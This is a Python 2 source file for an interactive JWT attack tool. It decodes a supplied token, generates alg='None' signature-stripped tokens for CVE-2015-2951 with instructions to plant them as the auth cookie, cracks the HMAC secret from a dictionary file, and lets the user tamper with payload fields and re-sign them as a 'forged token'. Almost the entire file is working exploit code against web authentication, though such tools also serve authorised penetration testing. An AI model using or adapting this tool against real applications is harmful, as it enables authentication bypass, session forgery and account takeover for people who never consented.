import sys
import hashlib
import hmac
import base64
import json
from threading import Thread

# Print usage + check token validity
if len(sys.argv) < 2:
	print "Usage: jwt_tool.py <JWT> (dictionary_file)"
	exit(1)

# temporary variables
jwt = sys.argv[1]
key = "secret"
if len(sys.argv) == 3:
	keyList = sys.argv[2]
	with open(keyList, "r") as f:
	    keyLst = f.readlines()
	keyLst = [x.strip() for x in keyLst]

# rejig token
try:
	tok1, tok2, sig = jwt.split(".",3)
	contents = tok1+"."+tok2
	head = base64.b64decode(tok1 + "=" * (-len(tok1) % 4))
	payl = base64.b64decode(tok2 + "=" * (-len(tok2) % 4))
	headDict = json.loads(head)
	paylDict = json.loads(payl)
except:
	print "Oh noes! Invalid token"
	exit(1)


def testKey(key, sig, contents):
	testSig = base64.b64encode(hmac.new(key,contents,hashlib.sha256).digest()).strip("=")
	if testSig == sig:
		print "[+] "+key+" is the CORRECT key!\n"
		exit(1)
	else:
		return
		
def checkCVE(headDict, tok2):
	print "\nGenerating alg-stripped token..."
	newHead = headDict
	newHead["alg"] = "None"
	newHead = base64.b64encode(json.dumps(newHead)).strip("=")
	CVEToken = newHead+"."+tok2+"."
	print "\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)"
	print "\n"+CVEToken+"\n"

def tamperToken(paylDict, headDict):
	print "\nToken payload values:"
	while True:
		i = 0
		paylList = [0]
		for pair in paylDict:
			menuNum = i+1
			print "["+str(menuNum)+"] "+pair+" = "+str(paylDict[pair])
			paylList.append(pair)
			i += 1
		print "[0] Continue to next step"
		selection = ""
		print "\nPlease select a field number:\n(or 0 to Continue)"
		selection = input("> ")
		if selection<len(paylList) and selection>0:
			print "\nCurrent value of "+paylList[selection]+" is: "+str(paylDict[paylList[selection]])
			print "Please enter new value and hit ENTER"
			newVal = raw_input("> ")
			paylDict[paylList[selection]] = newVal
		elif selection == 0:
			break
		else:
			exit(1)
	print "\nToken Signing:"
	print "[1] Sign token with known key"
	print "[2] Strip signature from token vulnerable to CVE-2015-2951"
	print "\nPlease select an option from above (1 or 2):"
	selection = input("> ")
	if selection == 1:
		print "\nPlease enter the known key:"
		key = raw_input("> ")
		newContents = base64.b64encode(json.dumps(headDict)).strip("=")+"."+base64.b64encode(json.dumps(paylDict)).strip("=")
		newSig = base64.b64encode(hmac.new(key,newContents,hashlib.sha256).digest()).strip("=")
		print "\nYour new forged token:"
		print newContents+"."+newSig+"\n"
		exit(1)
	elif selection ==2:
		print "\nStripped Signature"
		tok2 = base64.b64encode(json.dumps(paylDict)).strip("=")
		checkCVE(headDict, tok2)
		exit(1)
	else:
		exit(1)

	
	
	
if __name__ == '__main__':
	print "\n#######################"
	print "# JWT Tool - Analysis #"
	print "#######################"
	print "\nToken header values:"
	for i in headDict:
  		print "[+] "+i+" = "+str(headDict[i])
	print "\nToken payload values:"
	for i in paylDict:
  		print "[+] "+i+" = "+str(paylDict[i])
	print "\n######################################################"
	print "# Options:                                           #"
	print "# 1: Check CVE-2015-2951 - alg=None vulnerability    #"
	print "# 2: Check signature against a key                   #"
	print "# 3: Crack signature with supplied dictionary file   #"
	print "# 4: Tamper with payload data (key required)         #"
	print "######################################################"
	print "\nPlease make a selection (1-4)"
	selection = input("> ")
	if selection == 1:
		checkCVE(headDict, tok2)
	elif selection == 2:
		print "Type in the key to test"
		key = raw_input("> ")
		testKey(key, sig, contents)
		print "[-] "+key+" is not the correct key"
	elif selection == 3:
		print "\nTesting key dictionary..."
		print "File loaded: "+keyList
		for i in keyLst:
			#print str(keyLst.index(i))
			#testKey(i, sig, contents)
			t = Thread(target=testKey, args=(i, sig, contents))
			t.start()
	elif selection == 4:
		tamperToken(paylDict, headDict)
	exit(1)

	